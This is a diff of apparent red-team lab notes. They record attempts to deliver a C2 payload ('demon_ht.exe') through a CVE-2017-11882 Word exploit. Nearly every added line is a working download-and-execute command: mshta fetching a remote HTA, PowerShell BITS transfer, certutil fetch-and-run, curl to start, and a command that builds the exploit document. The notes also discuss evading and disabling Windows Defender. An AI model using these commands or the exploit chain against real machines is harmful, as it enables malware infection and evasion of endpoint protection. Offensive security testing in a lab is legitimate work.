@@ -86,6 +86,10 @@ however creating a download and execute with mshta
 
 `mshta.exe vbscript:Close(Execute("GetObject(""script:http://10.10.6.55:8000/legit.iso"")"))`
 
+but this works
+
+`mshta http://10.10.6.156:8000/test.html`
+
 ![](./mshta_caught.png)
 
 
@@ -232,9 +236,6 @@ for deobfuscating strings : https://github.com/mandiant/flare-floss
 
  can we disable any defender scipt?
  
-
-
-
 ### Trying 11882 delivery mechanism
 
 was not able to work with unamer's implementation
@@ -252,16 +253,61 @@ CreateObject(“Wscript.Shell”).Run “calc.exe”
 
 `mshta http://10.10.6.56:8000/abc`
 
+![](./mshta_not_working.png)
+
+using powershell to download
+
+`powershell -command Start-BitsTransfer http://10.10.6.56:8000/demon_ht.exe demon_ht.exe;`
+
+using certutil.exe  tp download
+
+`"certutil.exe -urlcache -split -f http://10.10.6.56:8000/demon_ht.exe %TEMP%\\demon_ht.exe & %TEMP%\\demon_ht.exe"`
+
 not working
 
-from lolbas mshta download and execute exploit was searhed
+from lolbas mshta download and execute exploit was searched
 
 however it was found tha tmshta doesnot work so instead we tried executing the binary itself.
 
-THen we needed to reduce thenumber of characterused so thatit can be put in a file within 43 bytes
+Then we needed to reduce thenumber of characterused so thatit can be put in a file within 43 bytes
 
 one thing to try: `curl <server name> -L -o a.exe`
 
+`curl -O  http://10.10.6.156:8000/a"`
+
+command that may work withthe exploit - https://github.com/starnightcyber/CVE-2017-11882
+
+
+```
+python2 Command_CVE-2017-11882.py -c "curl -O http://10.10.6.156:9/a.exe & .\a" -o test.doc 
+```
+
+However curl method did nont work even though we could get payload withing the word limit
+
+
+trying mshta again :
+
+trying from https://unit42.paloaltonetworks.com/unit42-analysis-of-cve-2017-11882-exploit-in-the-wild/
+
+
+this works : `mshta http://10.10.6.156:8000/test.html`
+
+when trying to load demon_ht through mshta it evades detection as well however there is a script error that come sup whenever we are tryin to run powershell bits transfer
+
+![](./error_in_mshta_powershell.png)
+
+mshta dropper doe not work with
+
+curl -s http://10.10.6.56:8000/demon_ht.exe | start demon.exe
+
+1. certutil doesnt work
+2. Curl doesnt work
+3. powershell normal - in memory execution
+
+works with mshta but not in exploit
+bitstransfer is not able to find the file however when put as document in powershell
+
+powershel encoding should we check?
 
 
 
